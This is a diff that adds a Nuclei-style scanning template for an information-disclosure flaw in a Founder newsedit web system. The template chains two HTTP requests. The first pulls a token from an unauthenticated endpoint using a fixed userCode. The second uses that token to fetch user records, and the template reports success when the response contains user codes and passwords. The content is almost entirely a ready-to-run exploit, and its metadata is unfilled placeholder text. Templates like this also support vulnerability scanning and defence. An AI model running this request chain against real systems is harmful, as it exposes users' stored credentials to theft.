@@ -1,0 +1,49 @@
+id: rmt-getUserInfo-info
+info:
+  name: Template Name
+  author: apple
+  severity: high
+  description: 北大方正-getUserInfo-信息泄露
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |+
+        GET //newsedit/tokenHelp/getToken.do?userCode=a18f178d935d2284a771f6f5903d7160 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
+        Accept: */*
+        Referer: http://{{Hostname}}/newsedit/scertlogin/Login.jsp
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: keep-alive
+
+      - |+
+        GET /newsedit/tokenHelp/getUserInfo.do?token={{token}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
+        Accept: */*
+        Referer: http://{{Hostname}}/newsedit/scertlogin/Login.jsp
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: keep-alive
+    extractors:
+      - type: regex
+        name: token
+        group: 1
+        regex:
+           - '"token":"(\S*)"'           
+        internal: true
+
+        
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'userCode'
+      - type: word
+        part: body
+        words:
+          - pwd
